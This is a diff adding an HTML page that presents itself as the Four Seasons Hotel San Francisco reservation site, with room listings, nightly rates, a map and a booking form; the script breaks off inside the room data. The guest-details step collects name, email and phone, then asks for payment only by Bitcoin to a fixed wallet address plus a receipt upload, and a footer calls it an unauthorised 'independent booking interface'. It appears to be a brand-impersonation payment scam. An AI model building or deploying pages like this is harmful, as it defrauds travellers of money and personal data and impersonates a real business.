@@ -1,0 +1,2921 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#0b1720">
+<title>Four Seasons Hotel San Francisco | Luxury Stay & Reservations</title>
+<meta name="description" content="Luxury accommodation booking experience. Select your dates, choose an accommodation, and submit your reservation request.">
+
+<script src="https://cdn.tailwindcss.com"></script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+
+<style>
+:root{
+  --ink:#0b1720;
+  --gold:#c8a96b;
+  --cream:#f6f2ea;
+  --line:#ddd5c7
+}
+
+*{
+  box-sizing:border-box;
+  scroll-behavior:smooth
+}
+
+body{
+  margin:0;
+  background:#fff;
+  color:#17212b;
+  font-family:Inter,Arial,sans-serif
+}
+
+.serif{
+  font-family:"Cormorant Garamond",Georgia,serif
+}
+
+.gold{
+  color:var(--gold)
+}
+
+.bg-ink{
+  background:var(--ink)
+}
+
+.btn-gold{
+  background:var(--gold);
+  color:#101820;
+  transition:.25s
+}
+
+.btn-gold:hover{
+  filter:brightness(1.08);
+  transform:translateY(-1px)
+}
+
+.btn-dark{
+  background:var(--ink);
+  color:#fff;
+  transition:.25s
+}
+
+.btn-dark:hover{
+  background:#172b39;
+  transform:translateY(-1px)
+}
+
+.hero{
+  min-height:92vh;
+  background:
+    linear-gradient(
+      90deg,
+      rgba(4,12,17,.78),
+      rgba(4,12,17,.34),
+      rgba(4,12,17,.15)
+    ),
+    url("hotel-hero.jpg") center/cover
+}
+
+.nav-blur{
+  background:rgba(8,19,27,.82);
+  backdrop-filter:blur(14px)
+}
+
+.card{
+  border:1px solid #e7e0d4;
+  background:#fff;
+  box-shadow:0 14px 40px rgba(15,25,30,.08)
+}
+
+.room-img{
+  height:245px;
+  object-fit:cover;
+  transition:transform .5s
+}
+
+.room-card:hover .room-img{
+  transform:scale(1.04)
+}
+
+.room-card{
+  overflow:hidden
+}
+
+input,select,textarea{
+  outline:none
+}
+
+input:focus,
+select:focus,
+textarea:focus{
+  border-color:var(--gold)!important;
+  box-shadow:0 0 0 3px rgba(200,169,107,.12)
+}
+
+.receipt-picker{
+  min-height:78px
+}
+
+.receipt-picker:active{
+  transform:scale(.995)
+}
+
+#receiptPreview img{
+  display:block
+}
+
+.modal-backdrop{
+  background:rgba(3,10,15,.72);
+  backdrop-filter:blur(5px)
+}
+
+.hidden-force{
+  display:none!important
+}
+
+.modal-shell{
+  max-height:92dvh;
+  display:flex;
+  flex-direction:column;
+  overflow:hidden;
+  border-radius:2px
+}
+
+.modal-header{
+  position:sticky;
+  top:0;
+  z-index:5;
+  background:#fff;
+  flex:none
+}
+
+.modal-scroll{
+  overflow-y:auto;
+  -webkit-overflow-scrolling:touch;
+  overscroll-behavior:contain
+}
+
+.modal-actions{
+  position:sticky;
+  bottom:0;
+  z-index:5;
+  background:#fff;
+  border-top:1px solid #e7e0d4;
+  padding:14px 24px
+}
+
+.mobile-back{
+  display:inline-flex;
+  align-items:center;
+  gap:8px;
+  color:#59636b;
+  font-size:12px;
+  font-weight:700;
+  text-transform:uppercase;
+  letter-spacing:.1em
+}
+
+.mobile-back:hover{
+  color:#0b1720
+}
+
+#guestForm input,
+#guestForm textarea,
+#guestForm select{
+  font-size:16px;
+  line-height:1.4
+}
+
+#guestForm input[type=file]{
+  font-size:14px
+}
+
+#guestModal{
+  overscroll-behavior:none
+}
+
+.toast{
+  animation:toastIn .25s ease
+}
+
+@media(max-width:640px){
+  #guestModal{
+    padding:0;
+    align-items:flex-end
+  }
+
+  .modal-shell{
+    width:100%;
+    max-width:none;
+    max-height:94dvh;
+    border-radius:18px 18px 0 0
+  }
+
+  .modal-header{
+    padding:16px 18px!important
+  }
+
+  .modal-scroll{
+    padding:18px!important
+  }
+
+  .modal-actions{
+    padding:12px 18px
+  }
+
+  .modal-scroll .payment-box{
+    padding:16px!important
+  }
+}
+
+@keyframes toastIn{
+  from{
+    opacity:0;
+    transform:translateY(10px)
+  }
+
+  to{
+    opacity:1;
+    transform:none
+  }
+}
+
+.reveal{
+  opacity:0;
+  transform:translateY(18px);
+  transition:.65s
+}
+
+.reveal.show{
+  opacity:1;
+  transform:none
+}
+
+.booking-sticky{
+  position:sticky;
+  top:90px
+}
+
+.small-label{
+  font-size:.72rem;
+  letter-spacing:.12em;
+  text-transform:uppercase;
+  font-weight:700;
+  color:#66717a
+}
+
+#hotelMap{
+  height:430px;
+  width:100%;
+  border-radius:2px;
+  overflow:hidden;
+  box-shadow:0 16px 40px rgba(15,25,30,.12)
+}
+
+.map-card{
+  border:1px solid #e7e0d4;
+  background:#fff;
+  box-shadow:0 14px 40px rgba(15,25,30,.08)
+}
+
+.map-pin{
+  background:#0b1720;
+  border:2px solid #c8a96b;
+  border-radius:50%;
+  width:34px;
+  height:34px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:#c8a96b;
+  box-shadow:0 4px 14px rgba(0,0,0,.35)
+}
+
+.leaflet-control-attribution{
+  font-size:10px
+}
+
+@media(max-width:640px){
+  #hotelMap{
+    height:360px
+  }
+}
+</style>
+</head>
+
+<body>
+
+<header class="fixed top-0 left-0 right-0 z-50 nav-blur text-white border-b border-white/10">
+
+  <div class="max-w-7xl mx-auto px-5 lg:px-8">
+
+    <div class="h-20 flex items-center justify-between">
+
+      <a href="#home" class="flex items-center gap-3">
+
+        <div class="w-10 h-10 rounded-full border border-[#c8a96b] flex items-center justify-center gold text-lg">
+          <i class="fa-solid fa-leaf"></i>
+        </div>
+
+        <div>
+          <div class="serif text-2xl leading-none">
+            Four Seasons
+          </div>
+
+          <div class="text-[9px] tracking-[.3em] uppercase text-white/60 mt-1">
+            San Francisco
+          </div>
+        </div>
+
+      </a>
+
+      <nav class="hidden lg:flex items-center gap-8 text-sm">
+        <a href="#home" class="hover:text-[#c8a96b]">Home</a>
+        <a href="#accommodations" class="hover:text-[#c8a96b]">Accommodations</a>
+        <a href="#experience" class="hover:text-[#c8a96b]">Experience</a>
+        <a href="#gallery" class="hover:text-[#c8a96b]">Gallery</a>
+        <a href="#location" class="hover:text-[#c8a96b]">Location</a>
+        <a href="#contact" class="hover:text-[#c8a96b]">Contact</a>
+      </nav>
+
+      <a href="#booking"
+         class="hidden sm:inline-flex btn-gold px-5 py-3 rounded-sm text-xs font-bold uppercase tracking-widest">
+        Reserve
+      </a>
+
+      <button id="menuBtn"
+              class="lg:hidden text-xl p-2"
+              aria-label="Open menu">
+        <i class="fa-solid fa-bars"></i>
+      </button>
+
+    </div>
+
+    <div id="mobileMenu" class="hidden lg:hidden pb-5">
+
+      <div class="grid gap-3 text-sm">
+
+        <a href="#home" class="py-2">Home</a>
+        <a href="#accommodations" class="py-2">Accommodations</a>
+        <a href="#experience" class="py-2">Experience</a>
+        <a href="#gallery" class="py-2">Gallery</a>
+        <a href="#location" class="py-2">Location</a>
+        <a href="#contact" class="py-2">Contact</a>
+
+        <a href="#booking"
+           class="btn-gold text-center py-3 mt-2">
+          Reserve
+        </a>
+
+      </div>
+
+    </div>
+
+  </div>
+
+</header>
+
+
+<main>
+
+<section id="home" class="hero text-white flex items-center">
+
+  <div class="max-w-7xl mx-auto px-5 lg:px-8 w-full pt-24">
+
+    <div class="max-w-3xl">
+
+      <p class="uppercase tracking-[.35em] text-xs gold font-bold mb-5">
+        Luxury stays • San Francisco
+      </p>
+
+      <h1 class="serif text-6xl sm:text-7xl lg:text-8xl leading-[.88] font-medium">
+        A refined stay in the heart of the city.
+      </h1>
+
+      <p class="mt-7 max-w-xl text-white/80 text-lg leading-8">
+        Discover elegant rooms, suites and residences designed for exceptional comfort, privacy and unforgettable city stays.
+      </p>
+
+      <div class="flex flex-wrap gap-3 mt-9">
+
+        <a href="#booking"
+           class="btn-gold px-7 py-4 rounded-sm font-bold uppercase tracking-widest text-xs">
+          Find your stay
+        </a>
+
+        <a href="#accommodations"
+           class="border border-white/40 hover:bg-white hover:text-[#0b1720] px-7 py-4 rounded-sm font-bold uppercase tracking-widest text-xs transition">
+          Explore rooms
+        </a>
+
+      </div>
+
+    </div>
+
+  </div>
+
+</section>
+
+
+<section class="bg-white relative -mt-12 z-10 px-5">
+
+  <div class="max-w-6xl mx-auto card p-5 lg:p-7">
+
+    <form id="quickSearch"
+          class="grid md:grid-cols-4 gap-4 items-end">
+
+      <div>
+        <label class="small-label">Check-in</label>
+        <input id="quickCheckIn"
+               type="date"
+               class="w-full mt-2 border p-3 rounded-sm">
+      </div>
+
+      <div>
+        <label class="small-label">Check-out</label>
+        <input id="quickCheckOut"
+               type="date"
+               class="w-full mt-2 border p-3 rounded-sm">
+      </div>
+
+      <div>
+        <label class="small-label">Guests</label>
+
+        <select id="quickGuests"
+                class="w-full mt-2 border p-3 rounded-sm">
+
+          <option>1</option>
+          <option selected>2</option>
+          <option>3</option>
+          <option>4</option>
+          <option>5</option>
+          <option>6</option>
+          <option>7</option>
+          <option>8</option>
+
+        </select>
+      </div>
+
+      <button class="btn-dark py-3.5 rounded-sm font-bold uppercase tracking-widest text-xs">
+        Search accommodations
+      </button>
+
+    </form>
+
+  </div>
+
+</section>
+
+
+<section class="py-24 px-5">
+
+  <div class="max-w-7xl mx-auto grid lg:grid-cols-2 gap-14 items-center">
+
+    <div class="reveal">
+
+      <p class="small-label gold">
+        An elevated city retreat
+      </p>
+
+      <h2 class="serif text-5xl lg:text-6xl mt-3 text-[#0b1720]">
+        Designed around your stay.
+      </h2>
+
+      <p class="text-gray-600 leading-8 mt-6">
+        From beautifully appointed rooms to expansive residences, each accommodation is presented with space, comfort and thoughtful details in mind.
+      </p>
+
+      <div class="grid grid-cols-2 gap-6 mt-9">
+
+        <div>
+          <div class="serif text-4xl gold">15</div>
+          <div class="text-sm text-gray-500 mt-1">
+            Accommodation choices
+          </div>
+        </div>
+
+        <div>
+          <div class="serif text-4xl gold">$877</div>
+          <div class="text-sm text-gray-500 mt-1">
+            Starting nightly rate
+          </div>
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="reveal">
+      <img src="hotel-hero.jpg"
+           class="w-full h-[520px] object-cover"
+           alt="Luxury hotel">
+    </div>
+
+  </div>
+
+</section>
+
+
+<section id="accommodations" class="py-24 px-5 bg-[#f7f4ee]">
+
+  <div class="max-w-7xl mx-auto">
+
+    <div class="flex flex-col md:flex-row md:items-end justify-between gap-5 mb-12">
+
+      <div>
+        <p class="small-label gold">
+          Stay your way
+        </p>
+
+        <h2 class="serif text-5xl lg:text-6xl text-[#0b1720] mt-2">
+          Accommodations
+        </h2>
+      </div>
+
+      <p class="text-gray-600 max-w-md">
+        Choose from rooms, suites, residences and signature spaces. Prices shown are nightly rates.
+      </p>
+
+    </div>
+
+    <div id="roomGrid"
+         class="grid md:grid-cols-2 xl:grid-cols-3 gap-7">
+    </div>
+
+  </div>
+
+</section>
+
+
+<section id="experience" class="py-24 px-5">
+
+  <div class="max-w-7xl mx-auto">
+
+    <div class="text-center max-w-2xl mx-auto mb-14">
+
+      <p class="small-label gold">
+        The experience
+      </p>
+
+      <h2 class="serif text-5xl mt-2">
+        Made for memorable days.
+      </h2>
+
+      <p class="text-gray-600 mt-4 leading-7">
+        A polished stay from arrival through departure, with room to relax, work, dine and explore.
+      </p>
+
+    </div>
+
+
+    <div class="grid sm:grid-cols-2 lg:grid-cols-4 gap-5">
+
+      <div class="card p-7">
+        <i class="fa-solid fa-concierge-bell gold text-2xl"></i>
+        <h3 class="serif text-2xl mt-5">
+          Personal Service
+        </h3>
+        <p class="text-sm text-gray-600 mt-2 leading-6">
+          Attentive assistance throughout your stay.
+        </p>
+      </div>
+
+      <div class="card p-7">
+        <i class="fa-solid fa-utensils gold text-2xl"></i>
+        <h3 class="serif text-2xl mt-5">
+          Dining
+        </h3>
+        <p class="text-sm text-gray-600 mt-2 leading-6">
+          Thoughtful dining moments for every occasion.
+        </p>
+      </div>
+
+      <div class="card p-7">
+        <i class="fa-solid fa-spa gold text-2xl"></i>
+        <h3 class="serif text-2xl mt-5">
+          Wellness
+        </h3>
+        <p class="text-sm text-gray-600 mt-2 leading-6">
+          Space to slow down, reset and recharge.
+        </p>
+      </div>
+
+      <div class="card p-7">
+        <i class="fa-solid fa-city gold text-2xl"></i>
+        <h3 class="serif text-2xl mt-5">
+          City Access
+        </h3>
+        <p class="text-sm text-gray-600 mt-2 leading-6">
+          A convenient base for discovering San Francisco.
+        </p>
+      </div>
+
+    </div>
+
+  </div>
+
+</section>
+
+
+<section id="booking" class="py-24 px-5 bg-[#f7f4ee]">
+
+  <div class="max-w-7xl mx-auto">
+
+    <div class="mb-12">
+
+      <p class="small-label gold">
+        Reservations
+      </p>
+
+      <h2 class="serif text-5xl lg:text-6xl mt-2">
+        Plan your stay
+      </h2>
+
+      <p class="text-gray-600 mt-3">
+        Select dates and an accommodation, then continue to guest and payment details.
+      </p>
+
+    </div>
+
+
+    <div class="grid lg:grid-cols-[1.2fr_.8fr] gap-8">
+
+      <div class="card p-6 lg:p-8">
+
+        <div class="grid md:grid-cols-2 gap-5">
+
+          <div>
+            <label class="small-label">Check-in</label>
+            <input id="checkIn"
+                   type="date"
+                   class="w-full mt-2 border p-3.5 rounded-sm">
+          </div>
+
+          <div>
+            <label class="small-label">Check-out</label>
+            <input id="checkOut"
+                   type="date"
+                   class="w-full mt-2 border p-3.5 rounded-sm">
+          </div>
+
+          <div>
+            <label class="small-label">Guests</label>
+
+            <select id="guests"
+                    class="w-full mt-2 border p-3.5 rounded-sm">
+
+              <option>1</option>
+              <option selected>2</option>
+              <option>3</option>
+              <option>4</option>
+              <option>5</option>
+              <option>6</option>
+              <option>7</option>
+              <option>8</option>
+
+            </select>
+          </div>
+
+          <div>
+            <label class="small-label">Accommodation</label>
+
+            <select id="roomSelect"
+                    class="w-full mt-2 border p-3.5 rounded-sm">
+            </select>
+          </div>
+
+        </div>
+
+        <div id="bookingDetails"
+             class="mt-7 p-5 bg-[#fbfaf7] border border-[#e6dfd3] rounded-sm">
+        </div>
+
+        <button id="continueBtn"
+                class="btn-dark w-full py-4 rounded-sm mt-6 font-bold uppercase tracking-widest text-xs">
+          Continue to guest details
+        </button>
+
+      </div>
+
+
+      <aside class="booking-sticky">
+
+        <div class="bg-ink text-white p-7 lg:p-8">
+
+          <p class="small-label text-white/50">
+            Reservation summary
+          </p>
+
+          <h3 class="serif text-3xl mt-2">
+            Your stay
+          </h3>
+
+          <div id="summary"
+               class="mt-6 text-sm">
+          </div>
+
+        </div>
+
+      </aside>
+
+    </div>
+
+  </div>
+
+</section>
+
+
+<section id="gallery" class="py-24 px-5">
+
+  <div class="max-w-7xl mx-auto">
+
+    <p class="small-label gold">
+      Gallery
+    </p>
+
+    <h2 class="serif text-5xl mt-2 mb-10">
+      A glimpse of the stay.
+    </h2>
+
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+
+      <img src="deluxe-king.jpg"
+           class="w-full h-64 object-cover"
+           alt="Deluxe King">
+
+      <img src="one-bedroom-suite.jpg"
+           class="w-full h-64 object-cover"
+           alt="One-Bedroom Suite">
+
+      <img src="residence-1.jpg"
+           class="w-full h-64 object-cover"
+           alt="Residence">
+
+      <img src="presidential-suite.jpg"
+           class="w-full h-64 object-cover"
+           alt="Presidential Suite">
+
+    </div>
+
+  </div>
+
+</section>
+
+
+<section class="py-24 px-5 bg-[#f7f4ee]">
+
+  <div class="max-w-5xl mx-auto text-center">
+
+    <p class="small-label gold">
+      Your reservation, clearly presented
+    </p>
+
+    <h2 class="serif text-5xl mt-2">
+      Submit now. Confirm after review.
+    </h2>
+
+    <p class="text-gray-600 max-w-2xl mx-auto mt-5 leading-7">
+      After submitting your booking and payment reference, your request remains awaiting confirmation until it has been reviewed.
+    </p>
+
+    <div class="mt-9 flex flex-wrap justify-center gap-4 text-sm">
+
+      <span class="px-5 py-3 bg-white border">
+        01 — Select dates
+      </span>
+
+      <span class="px-5 py-3 bg-white border">
+        02 — Choose accommodation
+      </span>
+
+      <span class="px-5 py-3 bg-white border">
+        03 — Submit details
+      </span>
+
+      <span class="px-5 py-3 bg-white border">
+        04 — Await confirmation
+      </span>
+
+    </div>
+
+  </div>
+
+</section>
+
+
+<section id="location" class="py-24 px-5 bg-[#f7f4ee]">
+
+  <div class="max-w-7xl mx-auto">
+
+    <div class="max-w-3xl mb-10 reveal">
+
+      <p class="small-label gold">
+        Location
+      </p>
+
+      <h2 class="serif text-5xl lg:text-6xl mt-3 text-[#0b1720]">
+        Find us in the heart of San Francisco.
+      </h2>
+
+      <p class="text-gray-600 leading-8 mt-5">
+        757 Market Street, San Francisco, California 94103, United States.
+      </p>
+
+    </div>
+
+
+    <div class="map-card p-3 lg:p-4">
+
+      <div id="hotelMap"
+           aria-label="Satellite map showing the hotel location">
+      </div>
+
+      <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 px-2 pt-5 pb-2">
+
+        <div>
+
+          <p class="font-bold text-[#0b1720]">
+            Four Seasons Hotel San Francisco
+          </p>
+
+          <p class="text-sm text-gray-600 mt-1">
+            757 Market St, San Francisco, CA 94103
+          </p>
+
+        </div>
+
+        <a href="https://www.google.com/maps/@37.786297,-122.403965,18z/data=!3m1!1e3"
+           target="_blank"
+           rel="noopener noreferrer"
+           class="btn-dark inline-flex items-center justify-center gap-2 px-5 py-3 rounded-sm text-xs font-bold uppercase tracking-widest">
+
+          <i class="fa-solid fa-satellite"></i>
+          Open satellite map
+
+        </a>
+
+      </div>
+
+    </div>
+
+  </div>
+
+</section>
+
+
+<section id="contact" class="py-24 px-5 bg-ink text-white">
+
+  <div class="max-w-7xl mx-auto grid lg:grid-cols-2 gap-14">
+
+    <div>
+
+      <p class="small-label gold">
+        Contact
+      </p>
+
+      <h2 class="serif text-5xl mt-2">
+        Plan your stay with us.
+      </h2>
+
+      <p class="text-white/65 leading-7 mt-5 max-w-xl">
+        For reservation questions, special requests or assistance, use the contact details provided by your booking operator.
+      </p>
+
+      <div class="mt-8 space-y-4 text-white/80 text-sm">
+
+        <div>
+          <i class="fa-solid fa-location-dot gold mr-3"></i>
+          San Francisco, California
+        </div>
+
+        <div>
+          <i class="fa-solid fa-envelope gold mr-3"></i>
+          reservations@example.com
+        </div>
+
+        <div>
+          <i class="fa-solid fa-phone gold mr-3"></i>
+          Reservation assistance
+        </div>
+
+      </div>
+
+    </div>
+
+
+    <form id="contactForm"
+          class="bg-white/5 border border-white/10 p-7">
+
+      <input required
+             placeholder="Your name"
+             class="w-full bg-white/10 border border-white/10 text-white p-3.5 mb-4">
+
+      <input required
+             type="email"
+             placeholder="Email address"
+             class="w-full bg-white/10 border border-white/10 text-white p-3.5 mb-4">
+
+      <textarea required
+                rows="5"
+                placeholder="How can we help?"
+                class="w-full bg-white/10 border border-white/10 text-white p-3.5 mb-4"></textarea>
+
+      <button class="btn-gold px-6 py-3.5 rounded-sm font-bold uppercase tracking-widest text-xs">
+        Send enquiry
+      </button>
+
+    </form>
+
+  </div>
+
+</section>
+
+</main>
+
+
+<footer class="bg-[#071017] text-white/50 px-5 py-8">
+
+  <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between gap-4 text-xs">
+
+    <div>
+      © <span id="year"></span>
+      Four Seasons Hotel San Francisco booking experience.
+    </div>
+
+    <div>
+      Independent booking interface — verify property authorization before public commercial use.
+    </div>
+
+  </div>
+
+</footer>
+
+
+<!-- GUEST DETAILS MODAL -->
+
+<div id="guestModal"
+     class="fixed inset-0 z-[80] hidden-force modal-backdrop items-center justify-center p-4">
+
+  <div class="bg-white max-w-2xl w-full shadow-2xl modal-shell">
+
+    <div class="modal-header p-5 lg:p-6 border-b flex justify-between items-center">
+
+      <div>
+
+        <div class="flex items-center gap-3">
+
+          <button type="button"
+                  id="backToBooking"
+                  class="mobile-back">
+
+            <i class="fa-solid fa-arrow-left"></i>
+            <span>Back</span>
+
+          </button>
+
+          <span class="text-gray-300">|</span>
+
+          <span class="small-label gold">
+            Step 2 of 2
+          </span>
+
+        </div>
+
+        <h3 class="serif text-3xl leading-none mt-2">
+          Guest details
+        </h3>
+
+      </div>
+
+      <button type="button"
+              id="closeGuestX"
+              class="w-10 h-10 rounded-full border border-gray-200 flex items-center justify-center text-xl text-gray-600 hover:bg-gray-50"
+              aria-label="Close">
+
+        <i class="fa-solid fa-xmark"></i>
+
+      </button>
+
+    </div>
+
+
+    <div class="modal-scroll">
+
+      <form id="guestForm"
+            class="p-5 lg:p-8">
+
+        <div class="mb-6 bg-[#fbfaf7] border border-[#e7e0d4] p-4 rounded-sm">
+
+          <div class="small-label gold">
+            Reservation selected
+          </div>
+
+          <div id="guestStaySummary"
+               class="text-sm text-gray-700 mt-2">
+          </div>
+
+        </div>
+
+
+        <div class="grid md:grid-cols-2 gap-4">
+
+          <input id="fullName"
+                 required
+                 placeholder="Full name"
+                 class="border p-3.5 rounded-sm">
+
+          <input id="email"
+                 required
+                 type="email"
+                 placeholder="Email address"
+                 class="border p-3.5 rounded-sm">
+
+          <input id="phone"
+                 required
+                 placeholder="Phone number"
+                 class="border p-3.5 rounded-sm">
+
+        </div>
+
+
+        <textarea id="specialRequest"
+                  rows="4"
+                  placeholder="Special requests (optional)"
+                  class="w-full border p-3.5 rounded-sm mt-4"></textarea>
+
+
+        <div class="mt-6 bg-[#f7f4ee] p-5 payment-box">
+
+          <p class="small-label">
+            Payment
+          </p>
+
+          <h4 class="serif text-2xl mt-1">
+            Bitcoin payment details
+          </h4>
+
+          <p class="text-sm text-gray-600 mt-2 leading-6">
+            Send the required Bitcoin payment to the address below. After payment, enter the transaction ID and upload your payment receipt.
+          </p>
+
+
+          <div class="mt-4 rounded-sm border border-gray-200 bg-white p-4">
+
+            <p class="text-xs uppercase tracking-widest font-bold text-gray-500">
+              Bitcoin payment address
+            </p>
+
+            <div class="mt-2 flex items-center gap-2">
+
+              <input id="bitcoinAddress"
+                     readonly
+                     value="133XcLHC29kRmQ6w5Di4S64dWdgnankf3g"
+                     class="w-full border border-gray-200 bg-gray-50 p-3 text-sm font-mono break-all">
+
+              <button type="button"
+                      id="copyBitcoinAddress"
+                      class="shrink-0 px-4 py-3 bg-[#0b1720] text-white rounded-sm text-xs font-bold uppercase tracking-wider">
+                Copy
+              </button>
+
+            </div>
+
+            <p id="copyBitcoinStatus"
+               class="text-xs text-gray-500 mt-2">
+            </p>
+
+          </div>
+
+
+          <input id="txid"
+                 placeholder="Bitcoin transaction ID / payment ID"
+                 class="w-full border p-3.5 rounded-sm mt-4">
+
+
+          <label class="block text-sm font-semibold mt-4">
+            Upload payment receipt
+          </label>
+
+          <input id="receipt"
+                 type="file"
+                 accept="image/*"
+                 class="sr-only">
+
+
+          <button type="button"
+                  id="receiptPicker"
+                  class="receipt-picker w-full mt-2 border border-dashed border-gray-300 bg-white rounded-sm p-5 text-left hover:border-gray-500 transition">
+
+            <span class="flex items-center gap-3">
+
+              <span class="w-11 h-11 rounded-full bg-[#f3efe6] flex items-center justify-center text-[#0b1720]">
+                <i class="fa-solid fa-camera"></i>
+              </span>
+
+              <span>
+
+                <span class="block font-semibold text-sm">
+                  Choose payment receipt
+                </span>
+
+                <span class="block text-xs text-gray-500 mt-1">
+                  Select a photo from your phone
+                </span>
+
+              </span>
+
+            </span>
+
+          </button>
+
+
+          <div id="receiptPreview"
+               class="hidden mt-3 rounded-sm overflow-hidden border border-gray-200 bg-white">
+
+            <div class="p-3 flex items-center justify-between gap-3 border-b">
+
+              <div class="min-w-0">
+
+                <p class="text-xs uppercase tracking-widest font-bold text-gray-500">
+                  Receipt selected
+                </p>
+
+                <p id="receiptName"
+                   class="text-sm font-medium truncate mt-1">
+                </p>
+
+              </div>
+
+              <button type="button"
+                      id="removeReceipt"
+                      class="text-xs font-bold uppercase tracking-wider text-gray-600">
+                Remove
+              </button>
+
+            </div>
+
+            <img id="receiptImage"
+                 class="w-full max-h-72 object-contain bg-gray-50"
+                 alt="Payment receipt preview">
+
+          </div>
+
+        </div>
+
+
+        <div class="mt-6 flex items-start gap-3">
+
+          <input id="agree"
+                 required
+                 type="checkbox"
+                 class="mt-1 w-4 h-4 flex-none">
+
+          <label for="agree"
+                 class="text-xs text-gray-600 leading-5">
+
+            I understand that submitting this request does not mean the reservation is confirmed. The booking remains awaiting confirmation until reviewed.
+
+          </label>
+
+        </div>
+
+      </form>
+
+    </div>
+
+
+    <div class="modal-actions flex gap-3">
+
+      <button type="button"
+              id="backToBookingBottom"
+              class="flex-1 border border-gray-300 py-3.5 rounded-sm font-bold uppercase tracking-widest text-xs">
+        Back
+      </button>
+
+      <button type="submit"
+              form="guestForm"
+              class="btn-dark flex-[1.5] py-3.5 rounded-sm font-bold uppercase tracking-widest text-xs">
+        Submit booking
+      </button>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+<!-- SUCCESS MODAL -->
+
+<div id="successModal"
+     class="fixed inset-0 z-[90] hidden-force modal-backdrop items-center justify-center p-4">
+
+  <div class="bg-white max-w-lg w-full p-8 text-center">
+
+    <div class="w-16 h-16 rounded-full bg-green-50 text-green-600 flex items-center justify-center mx-auto text-2xl">
+      <i class="fa-solid fa-check"></i>
+    </div>
+
+    <p class="small-label gold mt-6">
+      Booking request received
+    </p>
+
+    <h3 class="serif text-4xl mt-2">
+      Awaiting confirmation
+    </h3>
+
+    <p class="text-gray-600 mt-4 text-sm leading-6">
+      Your booking request has been sent for confirmation. You will receive your booking approval confirmation at the email address you provided.
+    </p>
+
+
+    <div class="bg-[#f7f4ee] p-5 mt-6 text-left">
+
+      <div class="text-xs text-gray-500">
+        Booking ID
+      </div>
+
+      <div id="successBookingId"
+           class="font-bold text-lg mt-1">
+      </div>
+
+
+      <div class="text-xs text-gray-500 mt-4">
+        Total
+      </div>
+
+      <div id="successTotal"
+           class="font-bold text-lg mt-1">
+      </div>
+
+
+      <div class="text-xs text-gray-500 mt-4">
+        Confirmation email
+      </div>
+
+      <div id="successEmail"
+           class="font-medium text-sm mt-1 break-all">
+      </div>
+
+    </div>
+
+
+    <button id="closeSuccess"
+            class="btn-dark w-full py-3.5 rounded-sm mt-6 font-bold uppercase tracking-widest text-xs">
+      Done
+    </button>
+
+  </div>
+
+</div>
+
+
+<div id="toast"
+     class="fixed bottom-5 right-5 z-[100] hidden-force bg-ink text-white px-5 py-4 rounded-sm shadow-xl text-sm">
+</div>
+
+
+<script>
+
+/* =========================================================
+   ACCOMMODATIONS
+========================================================= */
+
+const rooms=[
+
+{
+ name:"Deluxe King Room",
+ price:877,
+ img:"deluxe-king.jpg",
+ desc:"Elegant king accommodation with a refined, comfortable setting.",
+ guests:2,
+ amenities:"King bed • City setting • Wi-Fi"
+},
+
+{
+ name:"Premier King Room",
+ price:1050,
+ img:"premier-king.jpg",
+ desc:"A more spacious king room designed for a relaxed city stay.",
+ guests:2,
+ amenities:"King bed • Sitting area • Wi-Fi"
+},
+
+{
+ name:"City View Room",
+ price:1250,
+ img:"city-view.jpg",
+ desc:"A stylish room with a memorable urban outlook.",
+ guests:2,
+ amenities:"King bed • City view • Wi-Fi"
+},
+
+{
+ name:"Executive Room",
+ price:1500,
+ img:"executive-room.jpg",
+ desc:"Generous space with a dedicated work and relaxation area.",
+ guests:3,
+ amenities:"King bed • Work area • Wi-Fi"
+},
+
+{
+ name:"Executive Suite",
+ price:2600,
+ img:"executive-suite.jpg",
+ desc:"Separate living space and a sophisticated suite layout.",
+ guests:3,
+ amenities:"Bedroom • Living room • Premium bath"
+},
+
+{
+ name:"Premier Suite",
+ price:2900,
+ img:"premier-suite.jpg",
+ desc:"A polished suite with expansive living and sleeping areas.",
+ guests:3,
+ amenities:"King bed • Lounge • Premium bath"
+},
+
+{
+ name:"One-Bedroom Suite",
+ price:3200,
+ img:"one-bedroom-suite.jpg",
+ desc:"A private bedroom paired with a generous living room.",
+ guests:3,
+ amenities:"Separate bedroom • Living room • Wi-Fi"
+},
+
+{
+ name:"Luxury Suite",
+ price:3800,
+ img:"luxury-suite.jpg",
+ desc:"Elevated comfort with exceptional space and elegant details.",
+ guests:4,
+ amenities:"King bed • Lounge • Dining area"
+},
+
+{
+ name:"One-Bedroom Residence",
+ price:4200,
+ img:"residence-1.jpg",
+ desc:"Residence-style living for guests seeking extra privacy and space.",
+ guests:4,
+ amenities:"Bedroom • Full living area • Kitchenette"
+},
+
+{
+ name:"Two-Bedroom Residence",
+ price:4800,
+ img:"residence-2.jpg",
+ desc:"A spacious two-bedroom option for families or groups.",
+ guests:5,
+ amenities:"2 bedrooms • Living area • Kitchenette"
+},
+
+{
+ name:"Family Residence",
+ price:5200,
+ img:"family-residence.jpg",
+ desc:"Comfortable residence-style accommodation for longer family stays.",
+ guests:6,
+ amenities:"Multiple beds • Living area • Kitchenette"
+},
+
+{
+ name:"Signature Suite",
+ price:5800,
+ img:"signature-suite.jpg",
+ desc:"A distinctive suite experience with generous entertaining space.",
+ guests:4,
+ amenities:"Premium bedroom • Lounge • Dining"
+},
+
+{
+ name:"Presidential Suite",
+ price:6500,
+ img:"presidential-suite.jpg",
+ desc:"An expansive signature accommodation for an exceptional stay.",
+ guests:4,
+ amenities:"Grand living room • Premium bath • Dining"
+},
+
+{
+ name:"Luxury Penthouse",
+ price:7200,
+ img:"penthouse.jpg",
+ desc:"A high-end penthouse concept with generous private space.",
+ guests:6,
+ amenities:"Multiple spaces • Dining • Lounge"
